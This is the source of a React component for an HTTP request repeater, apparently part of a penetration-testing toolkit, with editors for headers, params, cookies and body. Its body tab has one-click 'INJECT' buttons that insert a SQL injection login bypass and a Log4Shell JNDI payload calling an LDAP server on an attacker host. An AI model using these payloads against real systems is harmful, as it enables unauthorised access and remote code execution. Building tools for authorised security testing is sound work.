import React, { useState } from 'react';
import {
  Send,
  Plus,
  Trash2,
  Code,
  Copy,
  Check,
  RotateCcw,
  Sparkles,
  Layers,
} from 'lucide-react';
import {
  HttpMethod,
  ParamItem,
  HeaderItem,
  CookieItem,
} from '../../types/httpRepeater';

export interface RequestEditorProps {
  method: HttpMethod;
  onMethodChange: (method: HttpMethod) => void;
  url: string;
  onUrlChange: (url: string) => void;
  params: ParamItem[];
  onParamsChange: (params: ParamItem[]) => void;
  headers: HeaderItem[];
  onHeadersChange: (headers: HeaderItem[]) => void;
  cookies: CookieItem[];
  onCookiesChange: (cookies: CookieItem[]) => void;
  body: string;
  onBodyChange: (body: string) => void;
  bodyType: 'json' | 'form' | 'raw';
  onBodyTypeChange: (type: 'json' | 'form' | 'raw') => void;
  loading: boolean;
  onSend: () => void;
  onReset: () => void;
}

export const RequestEditor: React.FC<RequestEditorProps> = ({
  method,
  onMethodChange,
  url,
  onUrlChange,
  params,
  onParamsChange,
  headers,
  onHeadersChange,
  cookies,
  onCookiesChange,
  body,
  onBodyChange,
  bodyType,
  onBodyTypeChange,
  loading,
  onSend,
  onReset,
}) => {
  const [activeTab, setActiveTab] = useState<'params' | 'headers' | 'cookies' | 'body'>('headers');
  const [isRawHeaders, setIsRawHeaders] = useState<boolean>(false);
  const [copiedCurl, setCopiedCurl] = useState<boolean>(false);
  const [copiedRaw, setCopiedRaw] = useState<boolean>(false);

  // Method Colors
  const getMethodBadge = (m: HttpMethod) => {
    switch (m) {
      case 'GET':
        return 'bg-sky-950 text-sky-400 border-sky-600';
      case 'POST':
        return 'bg-emerald-950 text-emerald-400 border-emerald-600';
      case 'PUT':
        return 'bg-amber-950 text-amber-400 border-amber-600';
      case 'PATCH':
        return 'bg-purple-950 text-purple-400 border-purple-600';
      case 'DELETE':
        return 'bg-red-950 text-red-400 border-red-600';
      default:
        return 'bg-slate-900 text-slate-300 border-slate-700';
    }
  };

  // Add / Delete Param Row
  const handleAddParam = () => {
    const newItem: ParamItem = {
      id: `param-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      key: '',
      value: '',
      enabled: true,
    };
    onParamsChange([...params, newItem]);
  };

  const handleDeleteParam = (id: string) => {
    onParamsChange(params.filter((p) => p.id !== id));
  };

  const handleUpdateParam = (id: string, field: keyof ParamItem, val: string | boolean) => {
    onParamsChange(
      params.map((p) => (p.id === id ? { ...p, [field]: val } : p))
    );
  };

  // Add / Delete Header Row
  const handleAddHeader = () => {
    const newItem: HeaderItem = {
      id: `hdr-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      key: '',
      value: '',
      enabled: true,
    };
    onHeadersChange([...headers, newItem]);
  };

  const handleDeleteHeader = (id: string) => {
    onHeadersChange(headers.filter((h) => h.id !== id));
  };

  const handleUpdateHeader = (id: string, field: keyof HeaderItem, val: string | boolean) => {
    onHeadersChange(
      headers.map((h) => (h.id === id ? { ...h, [field]: val } : h))
    );
  };

  // Raw Headers string conversion
  const rawHeadersString = headers
    .filter((h) => h.enabled && h.key)
    .map((h) => `${h.key}: ${h.value}`)
    .join('\n');

  const handleRawHeadersChange = (raw: string) => {
    const lines = raw.split('\n');
    const newHeaders: HeaderItem[] = lines
      .filter((l) => l.includes(':'))
      .map((l, idx) => {
        const firstColon = l.indexOf(':');
        const k = l.substring(0, firstColon).trim();
        const v = l.substring(firstColon + 1).trim();
        return {
          id: `hdr-${idx}`,
          key: k,
          value: v,
          enabled: true,
        };
      });
    onHeadersChange(newHeaders);
  };

  // Add / Delete Cookie Row
  const handleAddCookie = () => {
    const newItem: CookieItem = {
      id: `cook-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      name: '',
      value: '',
      path: '/',
      enabled: true,
    };
    onCookiesChange([...cookies, newItem]);
  };

  const handleDeleteCookie = (id: string) => {
    onCookiesChange(cookies.filter((c) => c.id !== id));
  };

  const handleUpdateCookie = (id: string, field: keyof CookieItem, val: string | boolean) => {
    onCookiesChange(
      cookies.map((c) => (c.id === id ? { ...c, [field]: val } : c))
    );
  };

  // Prettify JSON
  const handlePrettify = () => {
    try {
      const parsed = JSON.parse(body);
      onBodyChange(JSON.stringify(parsed, null, 2));
    } catch {
      // Ignored if not valid JSON
    }
  };

  // Copy as cURL
  const handleCopyCurl = () => {
    let curl = `curl -X ${method} "${url}"`;
    headers
      .filter((h) => h.enabled && h.key)
      .forEach((h) => {
        curl += ` \\\n  -H "${h.key}: ${h.value}"`;
      });
    if (body && method !== 'GET' && method !== 'HEAD') {
      curl += ` \\\n  -d '${body.replace(/'/g, "\\'")}'`;
    }
    navigator.clipboard.writeText(curl);
    setCopiedCurl(true);
    setTimeout(() => setCopiedCurl(false), 1500);
  };

  // Copy Raw HTTP Request
  const handleCopyRaw = () => {
    let raw = `${method} ${url} HTTP/1.1\n`;
    raw += rawHeadersString;
    if (body) {
      raw += `\n\n${body}`;
    }
    navigator.clipboard.writeText(raw);
    setCopiedRaw(true);
    setTimeout(() => setCopiedRaw(false), 1500);
  };

  // Handle keyboard shortcut Ctrl+Enter or Cmd+Enter
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
      e.preventDefault();
      onSend();
    }
  };

  const enabledHeadersCount = headers.filter((h) => h.enabled && h.key).length;
  const enabledParamsCount = params.filter((p) => p.enabled && p.key).length;
  const enabledCookiesCount = cookies.filter((c) => c.enabled && c.name).length;

  return (
    <div
      onKeyDown={handleKeyDown}
      className="flex flex-col h-full bg-[#070a0f] text-slate-200 font-mono text-xs overflow-hidden"
    >
      {/* Top Request Bar: Method Selector + URL Bar + Send Button */}
      <div className="p-3 bg-[#0a0f17] border-b border-slate-800 flex items-center gap-2 flex-wrap">
        {/* Method Selector */}
        <select
          value={method}
          onChange={(e) => onMethodChange(e.target.value as HttpMethod)}
          className={`px-3 py-1.5 rounded-lg border font-bold text-xs outline-none cursor-pointer tracking-wider ${getMethodBadge(
            method
          )}`}
        >
          <option value="GET" className="bg-slate-900 text-sky-400">GET</option>
          <option value="POST" className="bg-slate-900 text-emerald-400">POST</option>
          <option value="PUT" className="bg-slate-900 text-amber-400">PUT</option>
          <option value="PATCH" className="bg-slate-900 text-purple-400">PATCH</option>
          <option value="DELETE" className="bg-slate-900 text-red-400">DELETE</option>
          <option value="OPTIONS" className="bg-slate-900 text-slate-300">OPTIONS</option>
          <option value="HEAD" className="bg-slate-900 text-slate-300">HEAD</option>
        </select>

        {/* URL Path Input */}
        <div className="flex-1 min-w-[260px] relative">
          <input
            type="text"
            value={url}
            onChange={(e) => onUrlChange(e.target.value)}
            placeholder="http://10.10.11.45:80/api/endpoint"
            className="w-full px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-slate-100 text-xs focus:outline-none focus:border-cyan-500 font-mono transition"
          />
        </div>

        {/* Send Button */}
        <button
          onClick={onSend}
          disabled={loading}
          className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs transition shadow-lg shadow-emerald-950/40 disabled:opacity-50"
        >
          <Send className={`w-3.5 h-3.5 ${loading ? 'animate-pulse' : ''}`} />
          <span>{loading ? 'SENDING...' : 'SEND'}</span>
          <span className="hidden sm:inline text-[9px] px-1 py-0.2 rounded bg-black/30 text-emerald-950 font-normal">
            ⌘↵
          </span>
        </button>

        {/* Reset Action */}
        <button
          onClick={onReset}
          className="p-1.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-slate-200"
          title="Reset Request to Target Defaults"
        >
          <RotateCcw className="w-4 h-4" />
        </button>
      </div>

      {/* Request Tabs & Action Bar */}
      <div className="px-3 py-1.5 bg-[#090d15] border-b border-slate-800/80 flex items-center justify-between text-[11px]">
        {/* Navigation Tabs */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => setActiveTab('headers')}
            className={`px-3 py-1 rounded transition flex items-center gap-1.5 ${
              activeTab === 'headers'
                ? 'bg-slate-800 text-white font-bold'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <span>HEADERS</span>
            {enabledHeadersCount > 0 && (
              <span className="px-1.5 py-0.2 rounded-full text-[9px] bg-slate-700 text-emerald-400">
                {enabledHeadersCount}
              </span>
            )}
          </button>

          <button
            onClick={() => setActiveTab('params')}
            className={`px-3 py-1 rounded transition flex items-center gap-1.5 ${
              activeTab === 'params'
                ? 'bg-slate-800 text-white font-bold'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <span>PARAMS</span>
            {enabledParamsCount > 0 && (
              <span className="px-1.5 py-0.2 rounded-full text-[9px] bg-slate-700 text-cyan-400">
                {enabledParamsCount}
              </span>
            )}
          </button>

          <button
            onClick={() => setActiveTab('cookies')}
            className={`px-3 py-1 rounded transition flex items-center gap-1.5 ${
              activeTab === 'cookies'
                ? 'bg-slate-800 text-white font-bold'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <span>COOKIES</span>
            {enabledCookiesCount > 0 && (
              <span className="px-1.5 py-0.2 rounded-full text-[9px] bg-slate-700 text-amber-400">
                {enabledCookiesCount}
              </span>
            )}
          </button>

          <button
            onClick={() => setActiveTab('body')}
            className={`px-3 py-1 rounded transition flex items-center gap-1.5 ${
              activeTab === 'body'
                ? 'bg-slate-800 text-white font-bold'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <span>BODY</span>
            {body.length > 0 && (
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            )}
          </button>
        </div>

        {/* Copy Tools */}
        <div className="flex items-center gap-1.5">
          <button
            onClick={handleCopyCurl}
            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-400 hover:text-slate-200 flex items-center gap-1 text-[10px]"
            title="Copy as cURL command"
          >
            {copiedCurl ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
            <span>{copiedCurl ? 'COPIED!' : 'cURL'}</span>
          </button>

          <button
            onClick={handleCopyRaw}
            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-400 hover:text-slate-200 flex items-center gap-1 text-[10px]"
            title="Copy Raw HTTP Request text"
          >
            {copiedRaw ? <Check className="w-3 h-3 text-emerald-400" /> : <Code className="w-3 h-3" />}
            <span>RAW</span>
          </button>
        </div>
      </div>

      {/* Tab Panels */}
      <div className="flex-1 overflow-y-auto p-3">
        {/* PARAMS TAB */}
        {activeTab === 'params' && (
          <div className="space-y-2">
            <div className="flex items-center justify-between text-[11px] text-slate-400">
              <span>QUERY PARAMETERS</span>
              <button
                onClick={handleAddParam}
                className="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-emerald-400 flex items-center gap-1 text-[10px]"
              >
                <Plus className="w-3 h-3" />
                <span>ADD PARAM</span>
              </button>
            </div>

            <div className="border border-slate-800 rounded-lg overflow-hidden bg-slate-950/60">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b border-slate-800 bg-slate-900/80 text-slate-400 text-[10px]">
                    <th className="p-2 w-10 text-center">USE</th>
                    <th className="p-2">KEY</th>
                    <th className="p-2">VALUE</th>
                    <th className="p-2 w-10"></th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60">
                  {params.map((p) => (
                    <tr key={p.id} className="hover:bg-slate-900/40">
                      <td className="p-2 text-center">
                        <input
                          type="checkbox"
                          checked={p.enabled}
                          onChange={(e) => handleUpdateParam(p.id, 'enabled', e.target.checked)}
                          className="accent-emerald-500 rounded"
                        />
                      </td>
                      <td className="p-2">
                        <input
                          type="text"
                          value={p.key}
                          onChange={(e) => handleUpdateParam(p.id, 'key', e.target.value)}
                          placeholder="e.g. role"
                          className="w-full bg-transparent outline-none text-slate-200"
                        />
                      </td>
                      <td className="p-2">
                        <input
                          type="text"
                          value={p.value}
                          onChange={(e) => handleUpdateParam(p.id, 'value', e.target.value)}
                          placeholder="e.g. admin"
                          className="w-full bg-transparent outline-none text-cyan-400"
                        />
                      </td>
                      <td className="p-2 text-center">
                        <button
                          onClick={() => handleDeleteParam(p.id)}
                          className="text-slate-600 hover:text-red-400"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </td>
                    </tr>
                  ))}
                  {params.length === 0 && (
                    <tr>
                      <td colSpan={4} className="p-4 text-center text-slate-600 italic">
                        No query parameters configured. Click &apos;ADD PARAM&apos; or append ?param=val to the URL.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* HEADERS TAB */}
        {activeTab === 'headers' && (
          <div className="space-y-2">
            <div className="flex items-center justify-between text-[11px] text-slate-400">
              <div className="flex items-center gap-2">
                <span>REQUEST HEADERS</span>
                <button
                  onClick={() => setIsRawHeaders((prev) => !prev)}
                  className={`text-[10px] px-2 py-0.5 rounded border ${
                    isRawHeaders
                      ? 'bg-cyan-950 text-cyan-400 border-cyan-700'
                      : 'bg-slate-900 text-slate-400 border-slate-800'
                  }`}
                >
                  {isRawHeaders ? 'TABLE MODE' : 'RAW MODE'}
                </button>
              </div>

              {!isRawHeaders && (
                <button
                  onClick={handleAddHeader}
                  className="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-emerald-400 flex items-center gap-1 text-[10px]"
                >
                  <Plus className="w-3 h-3" />
                  <span>ADD HEADER</span>
                </button>
              )}
            </div>

            {isRawHeaders ? (
              <textarea
                value={rawHeadersString}
                onChange={(e) => handleRawHeadersChange(e.target.value)}
                rows={12}
                placeholder="Host: 10.10.11.45&#10;User-Agent: Mozilla/5.0&#10;Content-Type: application/json"
                className="w-full bg-[#0a0f17] border border-slate-800 text-slate-300 font-mono text-xs p-3 rounded-lg outline-none focus:border-cyan-500/60 resize-none"
                spellCheck={false}
              />
            ) : (
              <div className="border border-slate-800 rounded-lg overflow-hidden bg-slate-950/60">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="border-b border-slate-800 bg-slate-900/80 text-slate-400 text-[10px]">
                      <th className="p-2 w-10 text-center">USE</th>
                      <th className="p-2">HEADER</th>
                      <th className="p-2">VALUE</th>
                      <th className="p-2 w-10"></th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60">
                    {headers.map((h) => (
                      <tr key={h.id} className="hover:bg-slate-900/40">
                        <td className="p-2 text-center">
                          <input
                            type="checkbox"
                            checked={h.enabled}
                            onChange={(e) => handleUpdateHeader(h.id, 'enabled', e.target.checked)}
                            className="accent-emerald-500 rounded"
                          />
                        </td>
                        <td className="p-2 font-bold text-slate-200">
                          <input
                            type="text"
                            value={h.key}
                            onChange={(e) => handleUpdateHeader(h.id, 'key', e.target.value)}
                            placeholder="Header-Name"
                            className="w-full bg-transparent outline-none text-slate-200"
                          />
                        </td>
                        <td className="p-2 font-mono text-emerald-400">
                          <input
                            type="text"
                            value={h.value}
                            onChange={(e) => handleUpdateHeader(h.id, 'value', e.target.value)}
                            placeholder="Header Value"
                            className="w-full bg-transparent outline-none text-emerald-400"
                          />
                        </td>
                        <td className="p-2 text-center">
                          <button
                            onClick={() => handleDeleteHeader(h.id)}
                            className="text-slate-600 hover:text-red-400"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </td>
                      </tr>
                    ))}
                    {headers.length === 0 && (
                      <tr>
                        <td colSpan={4} className="p-4 text-center text-slate-600 italic">
                          No headers configured. Click &apos;ADD HEADER&apos; to specify custom headers.
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* COOKIES TAB */}
        {activeTab === 'cookies' && (
          <div className="space-y-2">
            <div className="flex items-center justify-between text-[11px] text-slate-400">
              <span>COOKIE JAR (SYNCED WITH COOKIE HEADER)</span>
              <button
                onClick={handleAddCookie}
                className="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-emerald-400 flex items-center gap-1 text-[10px]"
              >
                <Plus className="w-3 h-3" />
                <span>ADD COOKIE</span>
              </button>
            </div>

            <div className="border border-slate-800 rounded-lg overflow-hidden bg-slate-950/60">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b border-slate-800 bg-slate-900/80 text-slate-400 text-[10px]">
                    <th className="p-2 w-10 text-center">USE</th>
                    <th className="p-2">NAME</th>
                    <th className="p-2">VALUE</th>
                    <th className="p-2 w-20">PATH</th>
                    <th className="p-2 w-10"></th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60">
                  {cookies.map((c) => (
                    <tr key={c.id} className="hover:bg-slate-900/40">
                      <td className="p-2 text-center">
                        <input
                          type="checkbox"
                          checked={c.enabled}
                          onChange={(e) => handleUpdateCookie(c.id, 'enabled', e.target.checked)}
                          className="accent-emerald-500 rounded"
                        />
                      </td>
                      <td className="p-2 font-bold text-slate-200">
                        <input
                          type="text"
                          value={c.name}
                          onChange={(e) => handleUpdateCookie(c.id, 'name', e.target.value)}
                          placeholder="session_id"
                          className="w-full bg-transparent outline-none text-slate-200"
                        />
                      </td>
                      <td className="p-2 font-mono text-amber-400">
                        <input
                          type="text"
                          value={c.value}
                          onChange={(e) => handleUpdateCookie(c.id, 'value', e.target.value)}
                          placeholder="cookie_value"
                          className="w-full bg-transparent outline-none text-amber-400"
                        />
                      </td>
                      <td className="p-2 text-slate-400 text-[10px]">
                        <input
                          type="text"
                          value={c.path || '/'}
                          onChange={(e) => handleUpdateCookie(c.id, 'path', e.target.value)}
                          placeholder="/"
                          className="w-full bg-transparent outline-none text-slate-400"
                        />
                      </td>
                      <td className="p-2 text-center">
                        <button
                          onClick={() => handleDeleteCookie(c.id)}
                          className="text-slate-600 hover:text-red-400"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </td>
                    </tr>
                  ))}
                  {cookies.length === 0 && (
                    <tr>
                      <td colSpan={5} className="p-4 text-center text-slate-600 italic">
                        No cookies in request jar. Click &apos;ADD COOKIE&apos; to supply session tokens.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* BODY TAB */}
        {activeTab === 'body' && (
          <div className="flex flex-col h-full space-y-2">
            <div className="flex items-center justify-between text-[11px] text-slate-400">
              <div className="flex items-center gap-2">
                <span>PAYLOAD FORMAT:</span>
                <select
                  value={bodyType}
                  onChange={(e) => onBodyTypeChange(e.target.value as 'json' | 'form' | 'raw')}
                  className="bg-slate-900 border border-slate-800 rounded px-2 py-0.5 text-slate-200 text-[10px] outline-none"
                >
                  <option value="json">JSON (application/json)</option>
                  <option value="form">Form (application/x-www-form-urlencoded)</option>
                  <option value="raw">Raw / Plain text</option>
                </select>
              </div>

              {bodyType === 'json' && (
                <button
                  onClick={handlePrettify}
                  className="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-emerald-400 flex items-center gap-1 text-[10px]"
                  title="Format JSON with indentation"
                >
                  <Sparkles className="w-3 h-3" />
                  <span>PRETTIFY</span>
                </button>
              )}
            </div>

            <textarea
              value={body}
              onChange={(e) => onBodyChange(e.target.value)}
              rows={12}
              placeholder={
                bodyType === 'json'
                  ? '{\n  "username": "alex",\n  "password": "none"\n}'
                  : bodyType === 'form'
                  ? 'username=alex&password=none'
                  : 'Enter raw HTTP payload here...'
              }
              className="flex-1 w-full bg-[#0a0f17] border border-slate-800 text-slate-300 font-mono text-xs p-3 rounded-lg outline-none focus:border-cyan-500/60 resize-none min-h-[200px]"
              spellCheck={false}
            />

            {/* Quick Payload Snippets Bar */}
            <div className="pt-2 border-t border-slate-800/80 flex items-center gap-1.5 flex-wrap text-[10px]">
              <span className="text-slate-500 flex items-center gap-1">
                <Layers className="w-3 h-3" />
                <span>INJECT:</span>
              </span>
              <button
                onClick={() => onBodyChange('{"username": "admin\' OR 1=1 -- -", "password": "none"}')}
                className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 hover:border-amber-500/60 text-amber-400"
              >
                SQLi Auth Bypass
              </button>
              <button
                onClick={() => onBodyChange('{"audit_payload": "${jndi:ldap://10.10.14.22:1389/Exploit}"}')}
                className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 hover:border-red-500/60 text-red-400"
              >
                Log4Shell JNDI
              </button>
              <button
                onClick={() => onBodyChange('username=alex&password=alex123')}
                className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 hover:border-cyan-500/60 text-cyan-400"
              >
                Form Credentials
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
